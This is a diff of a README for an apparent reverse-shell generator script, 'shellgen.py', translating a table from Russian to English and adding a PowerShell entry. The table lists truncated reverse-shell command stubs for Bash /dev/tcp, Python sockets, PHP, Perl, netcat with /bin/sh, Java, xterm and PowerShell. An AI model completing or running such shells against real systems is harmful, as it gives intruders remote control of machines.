@@ -27,15 +27,16 @@ python3 shellgen.py
 </b>
 
 ## 📥 Supported Shells
-| № | Язык   | Команда                                |
-| - | ------ | -------------------------------------- |
-| 1 | Bash   | `bash -i >& /dev/tcp/...`              |
-| 2 | Python | `python3 -c 'import socket,...'`       |
-| 3 | PHP    | `php -r '$sock = fsockopen(...); ...'` |
-| 4 | Perl   | `perl -e 'use Socket; ...'`            |
-| 5 | Netcat | `nc -e /bin/sh ...`                    |
-| 6 | Java   | `Runtime.getRuntime().exec(...)`       |
-| 7 | Xterm  | `xterm -display IP:PORT`               |
+| № | Language  | Command                                |
+| - | ------    | -------------------------------------- |
+| 1 | Bash      | `bash -i >& /dev/tcp/...`              |
+| 2 | Python    | `python3 -c 'import socket,...'`       |
+| 3 | PHP       | `php -r '$sock = fsockopen(...); ...'` |
+| 4 | Perl      | `perl -e 'use Socket; ...'`            |
+| 5 | Netcat    | `nc -e /bin/sh ...`                    |
+| 6 | Java      | `Runtime.getRuntime().exec(...)`       |
+| 7 | Xterm     | `xterm -display IP:PORT`               |
+| 8 | Powershell| `powershell -c "$client = New-Objec...`|
 
 ## Conclusion:
 ```python
